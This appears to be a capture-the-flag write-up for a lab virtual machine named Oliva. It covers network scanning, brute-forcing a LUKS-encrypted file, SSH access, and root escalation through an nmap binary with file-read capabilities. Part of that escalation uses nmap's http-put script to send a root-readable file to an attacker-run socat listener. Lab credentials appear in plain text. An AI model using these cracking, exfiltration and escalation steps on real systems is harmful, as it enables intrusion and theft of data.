@@ -1,0 +1,311 @@
+---------- Oliva Writeup ----------
+
+--> netdiscover 
+  -- We use netdiscover to scan network and find the machine for me it is.  
+    10.0.2.28       08:00:27:25:f8:23      1      60  PCS Systemtechnik GmbH  
+
+
+--> nmap
+  (root㉿kali)-[*]
+  └─# nmap -sV -sC -p- -A 10.0.2.28 
+  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-02 19:46 EDT
+  Nmap scan report for 10.0.2.28
+  Host is up (0.00053s latency).
+  Not shown: 65533 closed tcp ports (reset)
+  PORT   STATE SERVICE VERSION
+  22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+  | ssh-hostkey: 
+  |   256 6d:84:71:14:03:7d:7e:c8:6f:dd:24:92:a8:8e:f7:e9 (ECDSA)
+  |_  256 d8:5e:39:87:9e:a1:a6:75:9a:28:78:ce:84:f7:05:7a (ED25519)
+  80/tcp open  http    nginx 1.22.1
+  |_http-title: Welcome to nginx!
+  |_http-server-header: nginx/1.22.1
+  MAC Address: 08:00:27:25:F8:23 (Oracle VirtualBox virtual NIC)
+  Device type: general purpose
+  Running: Linux 4.X|5.X
+  OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+  OS details: Linux 4.15 - 5.8
+  Network Distance: 1 hop
+  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+  TRACEROUTE
+  HOP RTT     ADDRESS
+  1   0.53 ms 10.0.2.28
+
+  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 25.89 seconds
+
+  -- 22/tcp ssh port and 80/tcp http port are open.
+
+
+--> whatweb
+  (root㉿kali)-[*]
+  └─# whatweb 10.0.2.28 
+  http://10.0.2.28 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.22.1], IP[10.0.2.28], Title[Welcome to nginx!], nginx[1.22.1]
+
+
+--> gobuster
+  (root㉿kali)-[*]
+  └─# gobuster dir -u http://10.0.2.28 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,php,txt         
+  ===============================================================
+  Gobuster v3.6
+  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+  ===============================================================
+  [+] Url:                     http://10.0.2.28
+  [+] Method:                  GET
+  [+] Threads:                 10
+  [+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+  [+] Negative Status codes:   404
+  [+] User Agent:              gobuster/3.6
+  [+] Extensions:              html,php,txt
+  [+] Timeout:                 10s
+  ===============================================================
+  Starting gobuster in directory enumeration mode
+  ===============================================================
+  /index.php            (Status: 200) [Size: 69]
+  /index.html           (Status: 200) [Size: 615]
+  Progress: 66514 / 882244 (7.54%)^C
+  [!] Keyboard interrupt detected, terminating.
+  Progress: 66582 / 882244 (7.55%)
+  ===============================================================
+  Finished
+  ===============================================================
+
+  -- Lets check /index.php and /index.html
+  -- http://10.0.2.28/index.html is the defult ngix page.
+
+
+--> curl 
+  ─(root㉿kali)-[*]
+  └─# curl http://10.0.2.28/index.php
+  Hi oliva,
+  Here the pass to obtain root:
+
+
+  <a href="oliva">CLICK!</a>
+
+  -- We have the username lets note it down.
+  -- If we click download we can see the file called oliva! lets check it.
+
+
+--> file 
+  (root㉿kali)-[*]
+  └─# file oliva   
+  oliva: LUKS encrypted file, ver 2, header size 16384, ID 3, algo sha256, salt 0x14fa423af24634e8...,
+  UUID: 9a391896-2dd5-4f2c-84cf-1ba6e4e0577e, crc 0x6118d2d9b595355f..., at 0x1000 
+  {"keyslots":{"0":{"type":"luks2","key_size":64,"af":{"type":"luks1","stripes":4000,"hash":"sha256"},
+  "area":{"type":"raw","offse
+
+  --I tried john and hydra but didn't get any result.
+  -- Luks encrypted file with version 2.
+  -- Let's check bruteforce-luks from github.
+
+
+--> brutefurce-luks
+  (root㉿kali)-[*]
+  └─# bruteforce-luks -t 4 -f /usr/share/wordlists/rockyou.txt -v 30  oliva 
+  Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
+
+  Password found: bebita
+
+
+--> cryptsetup
+  ──(root㉿kali)-[*]
+  └─# cryptsetup luksOpen oliva olivas_file
+  Enter passphrase for oliva: --> we got the password.
+
+  -- Open the file.
+  -- File path is /dev/mapper
+
+
+--> mount 
+  -- we are basically mounting it like that 
+  mkdir /tmp/example  
+  mount /dev/mapper/example_file /tmp/example
+
+  -- Look inside the file the mypass.txt is the password of the user!!
+
+
+--> ssh login 
+  ┌──(root㉿kali)-[*]
+  └─# ssh oliva@10.0.2.28                      
+  The authenticity of host '10.0.2.28 (10.0.2.28)' can't be established.
+  ED25519 key fingerprint is SHA256:OnLDHB94cEHXDxtn1kv9yVZxIy2mMSZymhm3iLeHp3M.
+  This host key is known by the following other names/addresses:
+      ~/.ssh/known_hosts:4: [hashed name]
+  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+  Warning: Permanently added '10.0.2.28' (ED25519) to the list of known hosts.
+  oliva@10.0.2.28's password: 
+  Linux oliva 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64
+
+  The programs included with the Debian GNU/Linux system are free software;
+  the exact distribution terms for each program are described in the
+  individual files in /usr/share/doc/*/copyright.
+
+  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+  permitted by applicable law.
+  Last login: Tue Jul  4 10:27:00 2023 from 192.168.0.100
+oliva@oliva:~$ whoami;id;hostname
+  oliva
+  uid=1000(oliva) gid=1000(oliva)                    grupos=1000(oliva),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users)  ,106(netdev)
+  oliva
+oliva@oliva:~$ cat user.txt
+  ------------------------- --> Get your user.txt flag  Congrats!!
+oliva@oliva:~$ sudo -l 
+  -bash: sudo: orden no encontrada
+
+ -- I tried to use sudo -l command but it didn't work.
+
+
+--> privilege escalation 
+  -- Lets check the system, int the /usr/sbin we found getcap.
+ 
+  oliva@oliva:~$ /usr/sbin/getcap -r / 2>/dev/null
+    /usr/bin/nmap cap_dac_read_search=eip
+    /usr/bin/ping cap_net_raw=ep
+
+  -- cap_dac_red_seach=eip is the file access permision in the linux OS.
+  -- We can read the root files with nmap.
+
+oliva@oliva:~$ nmap -iL /var/www/html/index.php
+  Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-03 10:13 CEST
+  Failed to resolve "Hi".
+  Failed to resolve "oliva,".
+  Failed to resolve "Here".
+  Failed to resolve "the".
+  Failed to resolve "pass".
+  Failed to resolve "to".
+  Failed to resolve "obtain".
+  Failed to resolve "root:".
+  Failed to resolve "<?php".
+  Failed to resolve "$dbname".
+  Failed to resolve "=".
+  Failed to resolve "'easy';".
+  Failed to resolve "$dbuser".
+  Failed to resolve "=".
+  Failed to resolve "'root';".
+  Failed to resolve "$dbpass".
+  Failed to resolve "=".
+  Failed to resolve "'Savingmypass';".
+  Failed to resolve "$dbhost".
+  Failed to resolve "=".
+  Failed to resolve "'localhost';".
+  Failed to resolve "?>".
+  Failed to resolve "<a".
+  Unable to split netmask from target expression: "href="oliva">CLICK!</a>"
+  WARNING: No targets were specified, so 0 hosts scanned.
+  Nmap done: 0 IP addresses (0 hosts up) scanned in 5.34 seconds
+
+  -- Check the GFTObins for priv. esc.
+
+
+--> In Kali Linux 
+  (root㉿kali)-[*]
+  └─# socat -v tcp-listen:8080,reuseaddr,fork -
+  2024/05/03 04:14:34 socat[2800] E read(6, 0x5610ab39b000, 8192): Connection reset by   peer
+  > 2024/05/03 04:14:34.000695693  length=336 from=0 to=335
+  PUT / HTTP/1.1\r
+  Host: 10.0.2.24:8080\r
+  User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org    /book/nse.html)\r
+  Content-Length: 163\r
+  Connection: close\r
+  \r
+ Hi oliva,
+Here the pass to obtain root:
+
+<?php
+$dbname = 'easy';
+$dbuser = 'root';
+$dbpass = 'Savingmypass';
+$dbhost = 'localhost';
+?>
+
+  <a href="oliva">CLICK!</a>
+  PUT / HTTP/1.1
+  Host: 10.0.2.24:8080
+  User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org  /book/nse.html)
+  Content-Length: 163
+  Connection: close
+
+Hi oliva,
+Here the pass to obtain root:
+
+<?php
+$dbname = 'easy'; --> mtSQL db name
+$dbuser = 'root'; --> mySQL user
+$dbpass = 'Savingmypass'; --> mySQL password
+$dbhost = 'localhost';
+?>
+
+
+--> In target machine 
+ oliva@oliva:~$ nmap -p 8080 10.0.2.24 --script http-put --script-args http-      put.url=/,http-put.file=/var/www/html/index.php
+  Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-03 10:17 CEST
+  Nmap scan report for 10.0.2.24
+  Host is up (0.0020s latency).
+
+  PORT     STATE SERVICE    
+  8080/tcp open  http-proxy
+  |_http-put: ERROR: Script execution failed (use -d to debug)
+
+  Nmap done: 1 IP address (1 host up) scanned in 8.28 seconds
+
+  -- We have the mySQL database 
+  -- Basic mySQL comands is enough for this part.
+oliva@oliva:~$ mysql -u root -p
+  Enter password: 
+  Welcome to the MariaDB monitor.  Commands end with ; or \g.
+  Your MariaDB connection id is 5
+  Server version: 10.11.3-MariaDB-1 Debian 12
+
+  Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+  Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> show databases;
+  +--------------------+
+  | Database           |
+  +--------------------+
+  | easy               |
+  | information_schema |
+  | mysql              |
+  | performance_schema |
+  | sys                |
+  +--------------------+
+  5 rows in set (0,005 sec)
+
+MariaDB [(none)]> use easy;
+  Reading table information for completion of table and column names
+  You can turn off this feature to get a quicker startup with -A
+
+  Database changed
+MariaDB [easy]> show tables;
+  +----------------+
+  | Tables_in_easy |
+  +----------------+
+  | logging        |
+  +----------------+
+  1 row in set (0,001 sec)
+
+MariaDB [easy]> select * from logging;
+  +--------+------+--------------+
+  | id_log | uzer | pazz         |
+  +--------+------+--------------+
+  |      1 | root | YourPasswd   |
+  +--------+------+--------------+
+  1 row in set (0,005 sec)
+
+  MariaDB [easy]> exit
+  Bye
+oliva@oliva:~$ su root 
+  Contraseña: 
+root@oliva:~# cat rutflag.txt
+------------------------- --> Congrats. here is your root.txt flag.
+
+
+
+
+  
+  
+
+
